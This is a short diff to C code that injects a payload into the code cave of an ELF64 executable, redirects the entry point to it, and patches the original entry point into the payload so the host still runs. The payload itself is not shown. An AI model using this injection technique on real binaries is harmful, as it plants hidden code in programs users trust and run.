@@ -42,8 +42,9 @@ static unsigned int get_text_data(const Elf64_Ehdr *file, const int filesize) {
 }
 
 unsigned int injection_x64(Elf64_Ehdr *file, const int filesize) {
+  char code[] = PAYLOAD;
   Elf64_Phdr *phdr;
-  Elf64_Off new_entry;
+  Elf64_Off old_entry, new_entry;
   int i, ret;
 
   if ((ret = sanitize_hdr(file, filesize))) return ret;
@@ -55,12 +56,17 @@ unsigned int injection_x64(Elf64_Ehdr *file, const int filesize) {
   if ((ret = sanitize_phdr(file, phdr, filesize, i + 1))) return ret;
   ret = phdr[i + 1].p_vaddr - (phdr[i].p_vaddr + phdr[i].p_memsz);
 
-  printf("cave: %d\n", ret);
+  printf("cave: %d - size of payload: %lu\n", ret, PAYLOAD_SIZE);
 
+  old_entry = file->e_entry;
   file->e_entry = phdr[i].p_vaddr + phdr[i].p_filesz;
   new_entry = phdr[i].p_offset + phdr[i].p_filesz;
-  char code[] = PAYLOAD;
-  ft_memcpy((void *)file + new_entry, code, sizeof(code));
+
+  ft_memcpy((void *)file + new_entry, code, PAYLOAD_SIZE);
+  /* patch code */
+  ft_memcpy((void *)file + new_entry + (PAYLOAD_SIZE - sizeof(Elf64_Off)),
+            &old_entry, sizeof(Elf64_Off));
+
   phdr[i].p_filesz += sizeof(code);
   phdr[i].p_memsz += sizeof(code);
 
